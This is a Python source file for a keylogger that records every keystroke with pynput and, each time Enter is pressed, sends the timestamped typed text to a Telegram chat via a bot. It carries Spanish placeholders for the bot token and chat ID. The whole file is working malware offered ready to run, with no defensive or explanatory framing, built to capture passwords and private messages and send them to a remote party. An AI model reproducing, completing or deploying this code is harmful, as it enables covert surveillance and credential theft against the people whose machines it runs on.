import pynput.keyboard
from telegram import Bot
from telegram.constants import ParseMode
import datetime
import asyncio
import threading

class TelegramKeylogger:
    def __init__(self, api_token, chat_id):
        self.bot = Bot(api_token)
        self.chat_id = chat_id
        self.buffer = []
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)

    def send_to_telegram(self, message):
        try:
            future = asyncio.run_coroutine_threadsafe(
                self.bot.send_message(chat_id=self.chat_id, text=message, parse_mode=ParseMode.MARKDOWN),
                self.loop
            )
            future.result(timeout=10)
        except Exception as e:
            print(f"Error sending message to Telegram: {e}")

    def evaluate_keys(self, key):
        try:
            pressed_key = str(key.char)
            self.buffer.append(pressed_key)
        except AttributeError:
            if key == key.space:
                self.buffer.append(" ")
            elif key == key.backspace:
                if self.buffer:
                    self.buffer.pop()
            elif key == key.enter:
                if self.buffer:
                    phrase = ''.join(self.buffer)
                    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    message = f"{timestamp} - {phrase}"
                    threading.Thread(target=self.send_to_telegram, args=(message,)).start()
                    self.buffer = [] 

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
        with keyboard_listener:
            try:
                self.loop.run_forever()
            except KeyboardInterrupt:
                pass
            finally:
                self.loop.close()

if __name__ == "__main__":
    api_token = 'PEGA EL TOKEN DEL BOT AQUI'
    chat_id = 'PEGA TU TOKEN AQUI'
    TelegramKeylogger(api_token, chat_id).start()

